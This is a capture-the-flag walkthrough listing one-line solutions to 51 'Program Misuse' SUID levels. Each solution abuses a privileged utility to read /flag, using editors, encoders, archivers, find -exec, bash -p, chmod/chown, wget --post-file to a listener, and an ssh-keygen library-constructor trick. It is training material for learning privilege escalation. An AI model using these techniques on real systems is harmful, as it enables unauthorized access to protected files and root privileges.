# Program Misuse

## Level 1

Steps:

```bash
cat /flag
```

## Level 2

Steps:

```bash
more /flag
```

## Level 3

Steps:

```bash
less /flag
```

## Level 4

Steps:

```bash
tail /flag
```

## Level 5

Steps:

```bash
head /flag
```

## Level 6

Steps:

```bash
sort /flag
```

## Level 7

Steps:

```bash
vim /flag
```

## Level 8

Steps:

```bash
emacs /flag
```

## Level 9

Steps:

```bash
nano /flag
```

## Level 10

Steps:

```bash
echo $(rev /flag) | rev
```

## Level 11

Steps:

```bash
echo $(od /flag --format=a --address-radix=n -w100)
```

## Level 12

Steps:

```bash
hd /flag
```

## Level 13

Steps:

```bash
xxd -c 64 /flag
```

## Level 14

Steps:

```bash
echo $(base32 --wrap=0 /flag) | base32 -d
```

## Level 15

Steps:

```bash
echo $(base64 --wrap=0 /flag) | base64 -d
```

## Level 16

Steps:

```bash
split /flag
cat xaa
```

## Level 17

Steps:

```bash
gzip /flag
gzip -c -d /flag.gz
```

## Level 18

Steps:

```bash
bzip2 /flag
bzip2 -c -d /flag.bz2
```

## Level 19

Steps:

```bash
zip flag.zip /flag
unzip flag.zip
cat flag
```

## Level 20

Steps:

```bash
tar -cf archive.tar /flag
tar --to-stdout -xf archive.tar
```

## Level 21

Steps:

```bash
ar r archive.a /flag
ar p archive.a
```

## Level 22

Steps:

```bash
echo /flag | cpio -o > archive.cpio
cpio -i --to-stdout < archive.cpio
```

## Level 23

Steps:

```bash
genisoimage -sort /flag
```

## Level 24

Steps:

```bash
env -i /bin/cat /flag
```

## Level 25

Steps:

```bash
find / -maxdepth 1 -type f -name flag -exec /bin/cat {} \;
```

## Level 26

Steps:

Create `Makefile` file containing

```make
main:
    cat /flag
```

Then run the file with `make` in the same directory

## Level 27

Steps:

```bash
nice /bin/cat /flag
```

## Level 28

Steps:

```bash
timeout 10 /bin/cat /flag
```

## Level 29

Steps:

```bash
stdbuf -o 0 /bin/cat /flag
```

## Level 30

Steps:

```bash
setarch -X /bin/cat /flag
```

## Level 31

Steps:

```bash
watch -x /bin/cat /flag
```

## Level 32

Steps:

```bash
socat -u FILE:/flag STDIO
```

## Level 33

Steps:

```bash
whiplash /flag 10 100
```

## Level 34

Steps:

```bash
awk '{print}' /flag
```

## Level 35

Steps:

```bash
sed -n '1p' /flag
```

## Level 36

Steps:

```bash
echo l | ed /flag
```

## Level 37

Steps:

```bash
chown $(whoami) /flag
cat /flag
```

## Level 38

Steps:

```bash
chmod +r /flag
cat /flag
```

## Level 39

Steps:

```bash
cp /flag /dev/stdout
```

## Level 40

Steps:

```bash
/challenge/babysuid_level40
mv /flag /bin/mv
/challenge/babysuid_level40
cat /bin/mv
```

## Level 41

Steps:

```perl
open(fh, '/flag') or die;
$flag = <fh>;
print "$flag";
```

## Level 42

Steps:

```python
open("/flag", 'r').read()
```

## Level 43

Steps:

```ruby
file = File.open('/flag')
flag = file.read
print flag
```

## Level 44

Steps:

```bash
bash -p
cat /flag
```

## Level 45

Steps:

```bash
date -f /flag
```

## Level 46

Steps:

```bash
dmesg -F /flag
```

## Level 47

Steps:

```bash
wc --files0-from /flag
```

## Level 48

Steps:

```bash
gcc -x c /flag
```

## Level 49

Steps:

```bash
as /flag
```

## Level 50

Steps:

```bash
nc -l 8888
wget --post-file=/flag localhost:8888
```

## Level 51

Steps:

Create a c file
```c
int main()
{
    puts("Hello");
}

__attribute__((constructor))
int my_function()
{
    puts("Hello");
    sendfile(1, open("/flag", 0), 0, 4096);
}
```

Then compile it with `gcc -shared main.c`. Last, run `ssh-keygen -D ./a.out`
